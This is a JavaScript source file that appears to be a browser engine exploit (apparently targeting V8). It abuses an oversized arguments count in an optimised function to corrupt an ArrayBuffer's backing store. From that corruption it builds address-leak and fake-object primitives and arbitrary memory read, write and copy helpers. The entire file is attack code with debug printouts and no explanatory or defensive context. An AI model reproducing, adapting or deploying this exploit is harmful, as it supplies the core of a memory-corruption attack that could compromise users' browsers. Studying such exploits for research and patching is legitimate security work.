function many_args() {
  function force_gc() {
    for (var i = 0; i < 0x80000; ++i) {
      var a = new ArrayBuffer();
    }
  }

  const kLengthOffset = 0x17;
  const kStoreOffset = 0x1f;
  const kBitsOffset = 0x27;
  const kSlotOffset = 0x3f;
  const kSize = 0x100;

  this.objToPtr = function (obj) {
    this.host_buffer.slot = obj;
    let ptr = this.getUint64(this.host_ptr + BigInt(kSlotOffset + 1)) - 1n;
    this.host_buffer.slot = {};
    return ptr;
  }

  this.ptrToObj = function (ptr) {
    this.setUint64(this.host_ptr + BigInt(kSlotOffset + 1), ptr | 1n, true);
    let obj = this.host_buffer.slot;
    this.host_buffer.slot = {};
    return obj;
  }

  this.getUint8 = function (address) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    let value = this.page_view.getUint8(0);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
    return value;
  }

  this.getUint16 = function (address) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    let value = this.page_view.getUint16(0, true);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
    return value;
  }

  this.getUint32 = function (address) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    let value = this.page_view.getUint32(0, true);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
    return value;
  }

  this.getUint64 = function (address) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    let value = this.page_view.getBigUint64(0, true);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
    return value;
  }

  this.hexdump = function (address, size) {
    var tmp = new ArrayBuffer(size)
    var tmp_view = new DataView(tmp);
    for (var i = 0; i < size; ++i) {
      tmp_view.setUint8(i, this.getUint8(address + BigInt(i)));
    }
    print(hexdump(tmp_view, address));
  }

  this.setUint8 = function (address, value) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    this.page_view.setUint8(0, value);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
  }

  this.setUint16 = function (address, value) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    this.page_view.setUint16(0, value, true);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
  }

  this.setUint32 = function (address, value) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    this.page_view.setUint32(0, value, true);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
  }

  this.setUint64 = function (address, value) {
    //this.buffer_view.setUint32(kBitsOffset, 3, true);
    this.buffer_view.setBigUint64(kStoreOffset, address, true);
    this.page_view.setBigUint64(0, value, true);
    //this.buffer_view.setBigUint64(kStoreOffset, 0n, true);
    //this.buffer_view.setUint32(kBitsOffset, 4, true);
  }

  this.memcpy = function(src, dst, size) {
    var i = 0n;
    while (size - i > 8n) {
      this.setUint64(dst + i, this.getUint64(src + i));
      i += 8n;
    }
    while (size - i > 0n) {
      this.setUint8(dst + i, this.getUint8(src + i));
      i += 1n;
    }
  }

  this.memswap = function(src, dst, size) {
    var i = 0n;
    while (size - i > 8n) {
      var tmp = this.getUint64(dst + i);
      this.setUint64(dst + i, this.getUint64(src + i));
      this.setUint64(src + i, tmp);
      i += 8n;
    }
    while (size - i > 0n) {
      var tmp = this.getUint8(dst + i);
      this.setUint8(dst + i, this.getUint8(src + i));
      this.setUint8(src + i, tmp);
      i += 1n;
    }
  }

  class LeakArrayBuffer extends ArrayBuffer {
    constructor(size) {
      super(size);
      this.slot = 0xb33f;
    }
  }

  this.host_buffer = new LeakArrayBuffer(0x80100);
  this.host_view = new DataView(this.host_buffer);
  // this will externalize the host_buffer, which changes gc behaviour.
  this.blob = new Blob([this.host_buffer]);

  // we want to make sure that the map for `this`.page_view expects a DataView
  this.page_view = this.host_view;

  let target_buffer = new LeakArrayBuffer(0x1000);
  let target_view = new DataView(target_buffer);

  // we want to make sure that host_buffer and target_buffer are in oldspace
  force_gc();


  function trigger(arg) {
    let array = [{}, {}, {}, {}, {}, {}];
    let buffer = new ArrayBuffer(0x100);

    let x = arguments.length;
    x = x >> 16;
    x *= 9;

    let y = arguments.length;
    y = y >> 16;
    y *= 10;

    // this will copy the original backingStore for `buffer` into the byteLength
    // and then write the first argument over the backingStore.
    array[x] = array[y];
    array[y] = arg;

    return buffer;
  }

  while (true) {
    let args = [target_buffer];
    args.length = 1;
    for (var i = 0; i < 0x10000; ++i) {
      trigger(...args);
    }

    args.length = (1<<16)+1;

    print('[many_args] setup');
    let corrupt_buffer = trigger(...args);
    let corrupt_view = new DataView(corrupt_buffer);
    if (corrupt_view.getUint32(kSlotOffset + 4, true) == 0xb33f) {
      let target_store_ptr = corrupt_view.getBigUint64(kStoreOffset, true);
      let corrupt_store_ptr = BigInt(corrupt_buffer.byteLength);

      function objToPtr(obj) {
        target_buffer.slot = obj;
        let ptr = corrupt_view.getBigUint64(kSlotOffset, true) - 1n;
        target_buffer.slot = 0xb33f;
        return ptr;
      }

      function ptrToObj(ptr) {
        corrupt_view.setBigUint64(kSlotOffset, ptr | 1n, true);
        let obj = target_buffer.slot;
        target_buffer.slot = 0xb33f;
        return obj;
      }

      function getUint64(ptr) {
        corrupt_view.setBigUint64(kStoreOffset, ptr, true);
        return target_view.getBigUint64(0, true);
      }

      function setUint64(ptr, value) {
        corrupt_view.setBigUint64(kStoreOffset, ptr, true);
        target_view.setBigUint64(0, value, true);
      }

      let corrupt_ptr = objToPtr(corrupt_buffer);
      let target_ptr = objToPtr(target_buffer);

      print('  [*] target_ptr:        0x' + target_ptr.toString(16));
      print('  [*] target_store_ptr:  0x' + target_store_ptr.toString(16));

      print('  [*] corrupt_ptr:       0x' + corrupt_ptr.toString(16));
      print('  [*] corrupt_store_ptr: 0x' + corrupt_store_ptr.toString(16));

      // OK, at this point corrupt_view lets us access the backing object for
      // target_buffer. In order to avoid GC issues, we're going to use this to
      // create a new, fake JSArrayBuffer inside host_buffer that we'll use for
      // our arbitrary read/write, and fix up the corrupted JSArrayBuffer that
      // we created during the trigger.

      this.host_ptr = objToPtr(this.host_buffer);
      let host_store_ptr = getUint64(this.host_ptr + BigInt(kStoreOffset + 1));
      let host_view_ptr = objToPtr(this.host_view);

      print('  [*] host_ptr:          0x' + this.host_ptr.toString(16));
      print('  [*] host_store_ptr:    0x' + host_store_ptr.toString(16));
      print('  [*] host_view_ptr:     0x' + host_view_ptr.toString(16));

      for (var i = 0; i < 0x98; i += 8) {
        this.host_view.setBigUint64(0x80000 + i, getUint64(this.host_ptr + BigInt(i)), true);
      }
      this.host_view.setBigUint64(0x80000 + kLengthOffset + 1, 0x1000n, true);

      for (var i = 0; i < 0x68; i += 8) {
        this.host_view.setBigUint64(0x80098 + i, getUint64(host_view_ptr + BigInt(i)), true);
      }
      this.host_view.setBigUint64(0x80098 + 0x18, host_store_ptr + 0x80001n, true);
      this.host_view.setBigUint64(0x80098 + 0x28, 0x1000n, true);

      let fake_view = ptrToObj(host_store_ptr + 0x80098n);

      this.host_view.setBigUint64(0x80000 + kStoreOffset + 1, target_ptr, true);
      fake_view.setBigUint64(kStoreOffset + 1, target_store_ptr, true);
      //print(hexdump(fake_view, 0n));

      this.host_view.setBigUint64(0x80000 + kStoreOffset + 1, corrupt_ptr, true);
      fake_view.setBigUint64(kStoreOffset + 1, corrupt_store_ptr, true);
      fake_view.setBigUint64(kLengthOffset + 1, 0x100n, true);
      //print(hexdump(fake_view, 0n));

      this.buffer = this.host_buffer;
      this.buffer_view = new DataView(this.host_buffer, 0x80001);

      this.page_view = fake_view;
      break;
    }
  }

  this.cleanup = function () {
    print('[many_args] cleanup');

    let this_ptr = this.objToPtr(this);
    let host_view_ptr = this.objToPtr(this.host_view) | 1n;
    let page_view_ptr = this.objToPtr(this.page_view) | 1n;

    for (var i = 0; i < 0x100; i += 8) {
      if (this.getUint64(this_ptr + BigInt(i)) == page_view_ptr) {
        this.setUint64(this_ptr + BigInt(i), host_view_ptr);
        break;
      }
    }

    for (var i = 0; i < this.host_buffer.byteLength; ++i) {
      this.host_view.setUint8(i, 0);
    }
  }

  return this;
}